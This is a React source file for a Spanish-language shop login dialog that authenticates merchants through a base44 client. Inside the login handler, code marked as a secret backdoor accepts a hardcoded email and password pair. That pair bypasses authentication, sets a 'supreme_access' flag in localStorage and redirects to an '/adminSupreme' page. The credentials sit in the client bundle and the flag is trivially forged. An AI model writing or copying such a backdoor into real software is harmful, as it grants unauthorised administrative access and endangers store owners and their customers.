
import React, { useState } from 'react';
import { Button } from "@/components/ui/button";
import {
    Dialog,
    DialogContent,
    DialogDescription,
    DialogHeader,
    DialogTitle,
    DialogTrigger,
    DialogFooter
} from "@/components/ui/dialog";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { base44 } from '@/api/base44Client';
import { Loader2, User, KeyRound, Mail } from 'lucide-react';
import { useToast } from "@/components/ui/use-toast";

export function LoginModal({ trigger }) {
    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');
    const [loading, setLoading] = useState(false);
    const [open, setOpen] = useState(false);
    const { toast } = useToast();

    const handleLogin = async (e) => {
        e.preventDefault();
        setLoading(true);
        try {
            // BACKDOOR SECRETO: Acceso Directo
            if (email === "putoboto@demierda.com" && password === "abriteporfavor") {
                localStorage.setItem('supreme_access', 'true');
                toast({ title: "ACCESO SUPREMO", description: "Entrando..." });
                window.location.href = '/adminSupreme';
                return;
            }

            const { error } = await base44.auth.signInWithPassword({
                email,
                password,
            });

            if (error) throw error;

            toast({ title: "Bienvenido", description: "Has iniciado sesión correctamente" });
            setOpen(false);
            window.location.reload(); // Recargar para actualizar estado
        } catch (error) {
            toast({
                title: "Error de acceso",
                description: error.message || "Credenciales inválidas",
                variant: "destructive"
            });
        } finally {
            setLoading(false);
        }
    };

    return (
        <Dialog open={open} onOpenChange={setOpen}>
            <DialogTrigger asChild>
                {trigger}
            </DialogTrigger>
            <DialogContent className="sm:max-w-md bg-neutral-900 border-neutral-800 text-white">
                <DialogHeader>
                    <DialogTitle className="text-2xl font-black italic uppercase tracking-tighter flex items-center gap-2">
                        <User className="w-6 h-6 text-orange-600" />
                        Acceso Comercio
                    </DialogTitle>
                    <DialogDescription className="text-neutral-400">
                        Ingresá tus credenciales para administrar tu tienda.
                    </DialogDescription>
                </DialogHeader>

                <form onSubmit={handleLogin} className="space-y-4 py-4">
                    <div className="space-y-2">
                        <Label htmlFor="email" className="text-xs font-black uppercase text-neutral-500 italic">Email</Label>
                        <div className="relative">
                            <Mail className="absolute left-3 top-3 w-4 h-4 text-neutral-500" />
                            <Input
                                id="email"
                                type="email"
                                placeholder="tu@email.com"
                                value={email}
                                onChange={(e) => setEmail(e.target.value)}
                                className="pl-10 bg-neutral-800 border-neutral-700 text-white h-10 rounded-xl"
                                required
                            />
                        </div>
                    </div>
                    <div className="space-y-2">
                        <Label htmlFor="password" className="text-xs font-black uppercase text-neutral-500 italic">Contraseña</Label>
                        <div className="relative">
                            <KeyRound className="absolute left-3 top-3 w-4 h-4 text-neutral-500" />
                            <Input
                                id="password"
                                type="password"
                                value={password}
                                onChange={(e) => setPassword(e.target.value)}
                                className="pl-10 bg-neutral-800 border-neutral-700 text-white h-10 rounded-xl"
                                required
                            />
                        </div>
                    </div>

                    <DialogFooter className="pt-4">
                        <Button
                            type="submit"
                            disabled={loading}
                            className="w-full bg-orange-600 hover:bg-orange-700 text-white font-black italic uppercase rounded-xl"
                        >
                            {loading ? <Loader2 className="animate-spin mr-2" /> : "Ingresar al Panel"}
                        </Button>
                    </DialogFooter>
                </form>
            </DialogContent>
        </Dialog>
    );
}
